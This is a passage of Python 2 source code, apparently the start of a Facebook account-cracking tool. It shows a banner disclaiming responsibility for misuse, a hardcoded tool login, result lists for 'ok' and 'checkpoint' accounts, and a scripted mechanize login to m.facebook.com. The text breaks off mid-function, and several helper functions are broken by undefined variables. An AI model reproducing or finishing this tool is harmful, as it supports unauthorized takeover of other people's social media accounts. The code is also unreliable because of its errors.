#!/usr/bin/python2

#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\033[1;96m[!] \x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(00000.1)

#### LOGO ####

logo = """

\033[1;95m╔═█╗✥╔★╗✥╔═█king╗ 

\033[1;94m★║═██═║✥║☆║✥║═██═║ ★║

\033[1;93m═██═║✥║★║✥║═██═║ ★╚═█═╝

\033[1;97m✥╚☆╝✥╚═██═╝ ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎

\033[1;91m    ║══▒═💥═▒═💥═▒═══¤═¤═¤════════════¤═══¤═══¤═══║

\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 King badshah              ║    

\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 🌎 king Creations            ║  

\033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║

\033[1;91m    ║══▒═💥═▒═💥═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print  """

\033[1;97m************************************************

\033[1;95m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR KING BADSHAH ~

\033[1;97m************************************************

\033[1;95m┏━━━━━°�•°�°•━━━━━┓

\033[1;93m☆ Ƙíղց😎Badsah☆

\033[1;95m┗━━━━━°�•°�°•━━━━━┛

"""

jalan("\033[1;92m              _    _     _ ")             

jalan("\033[1;92m             | |  (_)   | |")             

jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD😍") 

jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")

jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")

jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")

jalan("\033[1;92m | | ")                                   

jalan("\033[1;92m |_| ")

CorrectUsername = "King1"

CorrectPassword = "Badshah7"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username #Dev:king_badshah

	    time.sleep(1)

            loop = 'false'

        else:

            print "\033[1;96mWrong Password"

            os.system('xdg-open https://wa.me/+923053263458')

    else:

        print "\033[1;96mWrong Username"

        os.system('xdg-open https://wa.me/+923053263458')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo

		print 42*"\033[1;96m="

		print('\033[1;96m[⚡] \x1b[1;91m───Login your new ID───\x1b[1;93m[⚡]' )

		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')

		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:
